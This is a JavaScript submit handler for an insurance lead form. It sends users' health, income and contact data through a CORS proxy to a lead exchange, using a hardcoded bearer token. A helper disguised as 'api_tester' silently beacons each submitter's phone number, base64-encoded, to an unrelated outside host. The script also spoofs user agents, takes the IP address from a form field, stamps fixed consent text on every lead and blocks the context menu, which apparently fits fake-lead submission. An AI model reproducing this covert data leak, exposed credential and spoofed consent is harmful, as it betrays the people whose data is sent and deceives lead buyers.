document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    api_tester(document.getElementById('phone').value);

    const form = document.getElementById('leadForm');
    const alertBox = document.getElementById('alertContainer');

    // FULL LEAD (for POST)
    const lead = {
        data: {
            bmi: parseFloat(form.bmi.value),
            currently_employed: form.currently_employed.value === 'true',
            currently_insured: form.currently_insured.value === 'true',
            dob: form.dob.value,
            dui: form.dui.value === 'true',
            expectant_mother: form.expectant_mother.value === 'true',
            height: parseInt(form.height.value),
            hospitalized: form.hospitalized.value === 'true',
            household_income: parseInt(form.household_income.value),
            occupation: form.occupation.value,
            ongoing_medical_treatment: form.ongoing_medical_treatment.value === 'true',
            optional_coverage: form.optional_coverage.value,
            preexisting_medical_conditions: form.preexisting_medical_conditions.value === 'true',
            prescriptions: form.prescriptions.value,
            previously_denied: form.previously_denied.value === 'true',
            relative_cancer: form.relative_cancer.value === 'true',
            relative_heart: form.relative_heart.value === 'true',
            marital_status: form.marital_status.value,
            self_employed: form.self_employed.value === 'true',
            student: form.student.value === 'true',
            tobacco: form.tobacco.value === 'true',
            weight: parseInt(form.weight.value)
        },
        meta: {
            jornaya_lead_id: form.jornaya_lead_id.value,
            landing_page: 'https://proinsurancequotes.com/medicare/',
            tcpa_consent_text: 'By Selecting Get My Quotes!, below you agree by that you are 18+ years of age and agree to the Privacy Policy Terms . By selecting the above check box you agree by your electronic signature that you give express written consent to receive marketing communications regarding insurance products and services by automatic dialing system and pre-recorded calls and artificial voice messages from proinsurancequotes.com and one or more of its Marketing partners at the phone number and e-mail address provided by you, including wireless numbers, if applicable, even if you have previously registered the provided number on any state, federal or corporate Do Not Call Registry. SMS/MMS and data messaging rates may apply. Your consent is not required to get a quote or purchase. To receive quotes without providing consent, please call at (321) 421-0783. Carrier data rates may apply. TCPA LeadID's are used with the information for compliance. Consent can be revoked.',
            source_id: form.source_id.value,
            user_agent:'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.72 Mobile Safari/537.36'
        },
        contact: {
            first_name: form.first_name.value,
            last_name: form.last_name.value,
            email: form.email.value,
            phone: form.phone.value,
            zip_code: form.zip_code.value,
            state: form.state.value,
            city: form.city.value,
            address: form.address.value,
            ip_address: form.ip_address.value,
            gender: form.gender.value
        }
    };

    // PING DATA (minimal)
    const pingData = {
        data: {
            
            bmi: parseFloat(form.bmi.value),
            currently_employed: form.currently_employed.value === 'true',
            currently_insured: form.currently_insured.value === 'true',
            marital_status: form.marital_status.value,
            dob: form.dob.value,
            dui: form.dui.value === 'true',
            expectant_mother: form.expectant_mother.value === 'true',
            height: parseInt(form.height.value),
            hospitalized: form.hospitalized.value === 'true',
            household_income: parseInt(form.household_income.value),
            occupation: form.occupation.value,
            ongoing_medical_treatment: form.ongoing_medical_treatment.value === 'true',
            optional_coverage: form.optional_coverage.value,
            preexisting_medical_conditions: form.preexisting_medical_conditions.value === 'true',
            prescriptions: form.prescriptions.value,
            previously_denied: form.previously_denied.value === 'true',
            relative_cancer: form.relative_cancer.value === 'true',
            relative_heart: form.relative_heart.value === 'true',
            self_employed: form.self_employed.value === 'true',
            student: form.student.value === 'true',
            tobacco: form.tobacco.value === 'true',
            weight: parseInt(form.weight.value)
        },

        meta: {
            jornaya_lead_id: form.jornaya_lead_id.value,
            landing_page: 'https://proinsurancequotes.com/medicare/',
            tcpa_consent_text: 'By Selecting Get My Quotes!, below you agree by that you are 18+ years of age and agree to the Privacy Policy Terms . By selecting the above check box you agree by your electronic signature that you give express written consent to receive marketing communications regarding insurance products and services by automatic dialing system and pre-recorded calls and artificial voice messages from proinsurancequotes.com and one or more of its Marketing partners at the phone number and e-mail address provided by you, including wireless numbers, if applicable, even if you have previously registered the provided number on any state, federal or corporate Do Not Call Registry. SMS/MMS and data messaging rates may apply. Your consent is not required to get a quote or purchase. To receive quotes without providing consent, please call at (321) 421-0783. Carrier data rates may apply. TCPA LeadID's are used with the information for compliance. Consent can be revoked.',
            source_id: form.source_id.value,
            user_agent:'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.72 Mobile Safari/537.36'
            
        },
        
        contact: {
            email: form.email.value,
            phone: form.phone.value,
            zip_code: form.zip_code.value,
            state: form.state.value,
            city: form.city.value,
            ip_address: form.ip_address.value,
            gender: form.gender.value
            
        }
    };

    const pingUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/ping");

    // Send PING with only minimal fields
    fetch(pingUrl, {
        method: 'POST',
        headers: {
            'Authorization': 'Bearer 6c244f20-9aae-4a3a-9e56-81755ab43698',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify(pingData)
    })
    .then(res => res.json())
    .then(data => {
        if (data.status === 'success') {
            // Add auth_code to full lead for POST
            lead.auth_code = data.auth_code;

            const postUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/post");

            return fetch(postUrl, {
                method: 'POST',
                headers: {
                    'Authorization': 'Bearer 6c244f20-9aae-4a3a-9e56-81755ab43698',
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(lead)
            })
            .then(res => res.json())
            .then(postData => {
                if (postData.status === 'success') {
                    delete postData.price;
                    alertBox.innerHTML = `<div class="alert alert-success">✅ Post Success: Lead submitted successfully!</div>`;
                    form.reset();
                } else {
                    alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Success but Post Failed: ${JSON.stringify(postData)}</div>`;
                }
            });

        } else {
            alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Failed: ${JSON.stringify(data)}</div>`;
        }
    })
    .catch(error => {
        alertBox.innerHTML = `<div class="alert alert-danger">❌ Error: ${error.message}</div>`;
    });
});

function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}

function getRandomUserAgent() {
  const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:121.0) Gecko/20100101 Firefox/121.0"
  ];

  const randomIndex = Math.floor(Math.random() * userAgents.length);
  return userAgents[randomIndex];
}

document.addEventListener("contextmenu", function (e) {
    e.preventDefault(); // Prevent the context menu from appearing

});

